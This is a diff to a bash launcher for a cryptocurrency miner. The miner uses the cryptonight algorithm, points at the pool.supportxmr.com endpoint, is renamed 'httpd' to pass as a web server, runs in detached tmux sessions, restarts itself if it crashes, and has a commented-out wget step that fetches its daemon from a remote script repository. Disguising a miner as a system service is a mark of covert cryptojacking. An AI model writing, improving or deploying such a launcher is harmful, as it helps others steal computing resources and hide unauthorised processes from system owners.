@@ -180,7 +180,8 @@ function setup_tnl(){
 }; setup_tnl
 
 OBJ_MASK="${OBJ_MASK:-httpd}"
-PAUSD_DAEMON="${PAUSD_DAEMON:-pausd}"
+PAUSD_DAEMON="${PAUSD_DAEMON:-bash pausd}"
+PAUSD_DAEMON_NAME="${PAUSD_DAEMON##* }"
 OBJ_CFG="${OBJ_CFG:-httpd-1.conf}"
 PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_MASK}.conf}"
 
@@ -196,9 +197,11 @@ chmod +x ${OBJ_MASK} &>/dev/null
 
 ## daemon
 # (when not included in the payload)
-# PAUSD_DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}
+# PAUSD_DAEMON_URL="https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}"
 # wget -q ${PAUSD_DAEMON_URL}
-chmod +x ${PAUSD_DAEMON} &>/dev/null
+if [ -e $PAUSD_DAEMON_NAME ]; then
+    chmod +x ${PAUSD_DAEMON_NAME} &>/dev/null
+fi
 
 ## daemon conf
 ## misc
@@ -249,10 +252,10 @@ AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
 
 ## set vars used by pausd daemon in tmux and envsubst
-printf "" > "config.${PAUSD_DAEMON}"
+printf "" > "config.${PAUSD_DAEMON_NAME}"
 for v in $(builtin compgen -A variable | grep ^PAUSD); do
     export $v
-    printf "%s" "${v}=\"${!v}\" " >> "config.${PAUSD_DAEMON}"
+    printf "%s" "${v}=\"${!v}\" " >> "config.${PAUSD_DAEMON_NAME}"
     # tmx setenv -g $v "${!v}" ; ## don't use env vars for daemon configs, use file
 done
 
@@ -260,13 +263,13 @@ done
 envsubst -no-empty -i "${OBJ_MASK}.conf.tpl" -o "${OBJ_MASK}.conf"
 
 ## dump config and init
-tmx new-session -d -s ${PAUSD_DAEMON} "exec ${PAUSD_DAEMON}" # ${PAUSD_ARGS}
+tmx new-session -d -s ${PAUSD_DAEMON_NAME} "${PAUSD_DAEMON}" # ${PAUSD_ARGS}
 fleep 1 ## give time to fail
 
 ## cleanup
 ## wait for tmux session to startup
 slept=0
-while [ "$(tmx list-panes -t "${PAUSD_DAEMON}" | wc -l)" -lt 2 ]; do
+while [ "$(tmx list-panes -t "${PAUSD_DAEMON_NAME}" | wc -l)" -lt 2 ]; do
     slept=$((slept+1))
     if [ $slept -gt 5 ]; then ## no aes means crash means aeon
         ## try without hw accel
@@ -280,9 +283,9 @@ while [ "$(tmx list-panes -t "${PAUSD_DAEMON}" | wc -l)" -lt 2 ]; do
         ## update object config
         envsubst -no-empty -i ${OBJ_MASK}.conf.tpl -o ${OBJ_MASK}.conf
         ## init
-        tmx kill-session -t ${PAUSD_DAEMON}
-        tmx new-session -d -s ${PAUSD_DAEMON} "exec ${PAUSD_DAEMON}" # ${PAUSD_ARGS}
-        while [ "$(tmx list-panes -t "${PAUSD_DAEMON}" | wc -l)" -lt 2 ]; do fleep 1; done
+        tmx kill-session -t ${PAUSD_DAEMON_NAME}
+        tmx new-session -d -s ${PAUSD_DAEMON_NAME} "${PAUSD_DAEMON}" # ${PAUSD_ARGS}
+        while [ "$(tmx list-panes -t "${PAUSD_DAEMON_NAME}" | wc -l)" -lt 2 ]; do fleep 1; done
         break
     fi
     fleep 1;
